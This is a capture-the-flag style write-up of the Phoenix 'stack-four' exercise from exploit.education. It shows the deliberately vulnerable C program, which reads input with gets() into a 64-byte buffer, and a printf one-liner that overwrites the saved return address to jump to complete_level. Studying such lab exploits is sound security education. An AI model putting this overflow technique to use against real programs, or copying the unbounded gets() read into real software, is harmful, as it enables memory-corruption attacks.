# Phoenix and Protostar -- Stack 4


## Level Information
Stack Four takes a look at what can happen when you can overwrite the saved instruction pointer (standard buffer overflow).

**Hints** <ul>
<li> The saved instruction pointer is not necessarily directly after the end of variable allocations – things like compiler padding can increase the size. [Did you know that some architectures may not save the return address on the stack in all cases?](https://en.wikipedia.org/wiki/Link_register)</li>
 
 <li> GDB supports “run < my_file” to direct input from my_file into the program. </li>
</ul>


```C
/*
 * phoenix/stack-four, by https://exploit.education
 *
 * The aim is to execute the function complete_level by modifying the
 * saved return address, and pointing it to the complete_level() function.
 *
 * Why were the apple and orange all alone? Because the bananna split.
 */

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

char *gets(char *);

void complete_level() {
  printf("Congratulations, you've finished " LEVELNAME " :-) Well done!\n");
  exit(0);
}

void start_level() {
  char buffer[64];
  void *ret;

  gets(buffer);

  ret = __builtin_return_address(0);
  printf("and will be returning to %p\n", ret);
}

int main(int argc, char **argv) {
  printf("%s\n", BANNER);
  start_level();
}
```


## Solution
This level was a classic stack buffer overflow exploit, to overwrite the saved return instruction pointer to point to the `complete_level` function instead of returning to the `main`. Also, since we are dealing with a 64-bit binary here, we need to make sure we pad the exploit address with enough zeros, so that it would qualify for a valid return, not doing so would lead to **Segmentation Fault**.

The command to create the exploit:
    For Phoenix: `printf "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x1d\x06@\x00\x00\x00\x00\x00" | ./stack-four`


<footer> The side-notes led to reading about **Link Registers** on some architecture. Found them fasinating. Also the `@` in the exploit is not a mistake. `\x40` is the hex representation of `@` <footer>
